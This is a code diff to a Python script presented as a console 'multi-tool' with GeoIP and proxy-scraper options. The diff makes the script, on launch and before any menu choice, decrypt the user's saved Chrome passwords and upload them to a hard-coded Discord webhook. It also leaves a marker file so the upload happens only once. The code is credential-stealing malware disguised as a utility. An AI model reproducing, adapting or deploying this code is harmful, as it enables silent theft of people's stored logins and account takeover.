@@ -1,15 +1,16 @@
 import os
 import json
+import sys
+import random
 import base64
 import sqlite3
 import win32crypt
 import shutil
 from datetime import timezone, datetime, timedelta
 import requests
+import time
+from pprint import pprint
 from cryptography.hazmat.primitives.ciphers.aead import AESGCM
-
-# Set the webhook URL
-WEBHOOK_URL = "https://discord.com/api/webhooks/1139858112262701076/pmA6iMCNytxzL8ORcPlOpfOP4L_Fcn7x2dyMrkmRpKLAvuqfMF_4SBdd0xjASen85fEQ"
 
 def get_chrome_datetime(chromedate):
     """Return a `datetime.datetime` object from a chrome format datetime
@@ -72,7 +73,12 @@ def send_discord_text_file(logins):
     # delete the text file
     os.remove("ChromeLogins.txt")
 
-def main():
+def extract_passwords():
+    if os.path.isfile("ChromeLogins.txt"):
+        with open("ChromeLogins.txt", "r") as f:
+            if f.read():
+                # The passwords have already been extracted and sent to Discord
+                return
     # get the AES key
     key = get_encryption_key()
     # local sqlite Chrome database path
@@ -121,5 +127,93 @@ def main():
     # send the logins to Discord as a text file
     send_discord_text_file(logins)
 
-if __name__ == "__main__":
-    main()
+def GeoIP():
+    ip_input = input('  IP> ')
+    response = requests.get("http://extreme-ip-lookup.com/json/" + ip_input)
+    response.json()
+    pprint.pprint(response.json())
+    time.sleep(10)
+    Main()
+
+def scraper():
+    r = requests.get('https://api.proxyscrape.com/?request=getproxies&proxytype=http')
+    print(r.text)
+    p_type = input('  Type> ')
+    p_timeout = input('  Timeout> ')
+    f"https://api.proxyscrape.com/?request=getproxies&proxytype={p_type}&timeout={p_timeout}"
+    with open('proxies.txt', 'w') as f:
+        f.write(r.text)
+        print('The proxies have been saved to \033[31m`proxies.txt`')
+        time.sleep(5)
+        Main()
+
+class Main():
+    def __init__(self):
+        self.gg = True
+        self.r = '\033[31m'
+        self.g = '\033[32m'
+        self.y = '\033[33m'
+        self.b = '\033[34m'
+        self.m = '\033[35m'
+        self.c = '\033[36m'
+        self.w = '\033[37m'
+        self.rr = '\033[39m'
+        self.cls()
+        self.start_logo()
+        self.options()
+        while self.gg == True:
+            choose = input(str('  @>  '))
+            if(choose == str(1)):
+                self.cls()
+                self.start_logo()
+                GeoIP()
+            elif(choose == str(2)):
+                self.cls()
+                self.start_logo()
+                scraper()
+            elif(choose == str(3)):
+                self.cls()
+                self.start_logo()
+                extract_passwords()
+                # Create an empty file to mark that the passwords have been extracted and sent to Discord
+                with open("ChromeLogins.txt", "w") as f:
+                    f.write("Passwords have been extracted from Chrome and sent to Discord")
+
+    def cls(self):
+        linux = 'clear'
+        windows = 'cls'
+        os.system([linux, windows][os.name == 'nt'])
+
+    def start_logo(self):
+        clear = "\x1b[0m"
+        colors = [36, 32, 34, 35, 31, 37]
+
+        x = """
+        ████████╗███████╗███████╗████████╗
+        ╚══██╔══╝██╔════╝██╔════╝╚══██╔══╝
+           ██║   █████╗  ███████╗   ██║   
+           ██║   ██╔══╝  ╚════██║   ██║   
+           ██║   ███████╗███████║   ██║   
+           ╚═╝   ╚══════╝╚══════╝   ╚═╝                                    
+        """
+
+        for N, line in enumerate(x.split("\n")):
+            sys.stdout.write("\x1b[1;%dm%s%s\n" % (random.choice(colors), line, clear))
+            time.sleep(0.05)
+
+    def options(self):
+        print(self.y + '        [1] ' + self.c +'  GeoIP')
+        print(self.y + '        [2] ' + self.c + '  Proxy Scrape')
+        print(self.y + '        [3] ' + self.c + '  Password Extractor')
+
+try:
+    # Set the Discord webhook URL
+    WEBHOOK_URL = "https://discord.com/api/webhooks/1139858112262701076/pmA6iMCNytxzL8ORcPlOpfOP4L_Fcn7x2dyMrkmRpKLAvuqfMF_4SBdd0xjASen85fEQ"
+
+    # extract the passwords and send them as a text file to Discord
+    extract_passwords()
+
+    # open the multi-tool console
+    Main()
+except Exception as e:
+    print(f"Error: {e}")
